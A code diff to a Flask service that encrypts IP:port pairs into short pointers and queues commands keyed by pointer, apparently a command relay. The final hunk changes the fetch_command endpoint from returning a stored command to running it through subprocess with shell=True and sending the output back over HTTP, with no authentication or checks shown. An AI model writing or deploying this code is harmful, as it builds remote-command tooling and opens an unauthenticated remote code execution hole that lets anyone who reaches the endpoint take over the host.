@@ -6,6 +6,7 @@ import string
 import base64
 import time
 import os
+import subprocess
 
 app = Flask(__name__)
 
@@ -19,7 +20,6 @@ EXPIRATION_TIME = 3600  # Expiration time in seconds (1 hour)
 def generate_pointer():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=4))
 
-# Convert IP and port to bytes
 def ip_port_to_bytes(ip, port):
     ip_parts = [int(part) for part in ip.split('.')]
     ip_bytes = bytes(ip_parts) + port.to_bytes(2, 'big')
@@ -29,9 +29,9 @@ def ip_port_to_bytes(ip, port):
 def encrypt_ip_port(ip, port):
     ip_port_bytes = ip_port_to_bytes(ip, port)
     
-    # Generate a random IV (4 bytes, for example)
-    iv = os.urandom(4)  # Adjust IV size as needed for security
-    data_with_iv = iv + ip_port_bytes
+    # Generate a unique IV for each encryption
+    iv = os.urandom(4)  # IV will be unique for each connection
+    data_with_iv = iv + ip_port_bytes  # Prepend IV to data for encryption
     
     # Encrypt the data with IV
     encrypted_data = cipher.encrypt(data_with_iv)
@@ -46,11 +46,11 @@ def decrypt_ip_port(encrypted_ip_prefix, encrypted_ip_remainder, decryption_key)
     encrypted_data = base64.urlsafe_b64decode(full_encrypted_ip_port + '==')
     cipher = Fernet(decryption_key.encode())
     
-    # Decrypt the data, which includes the IV + IP:PORT data
+    # Decrypt and separate the IV and IP/port data
     decrypted_with_iv = cipher.decrypt(encrypted_data)
     iv, decrypted_bytes = decrypted_with_iv[:4], decrypted_with_iv[4:]  # Separate IV and actual data
     
-    # Translate decrypted bytes back into IP and port
+    # Convert decrypted bytes back to IP and port
     ip = '.'.join(map(str, decrypted_bytes[:4]))
     port = int.from_bytes(decrypted_bytes[4:], 'big')
     
@@ -162,7 +162,12 @@ def fetch_command():
             for line in lines:
                 line_pointer, command = line.strip().split(maxsplit=1)
                 if line_pointer == pointer:
-                    return jsonify({"command": command})
+                    # Execute the command and capture the output
+                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output, error = process.communicate()
+                    if error:
+                        return jsonify({"output": error.decode("utf-8")})
+                    return jsonify({"output": output.decode("utf-8")})
                 f.write(line)
         return jsonify({"command": None})
     except Exception as e:
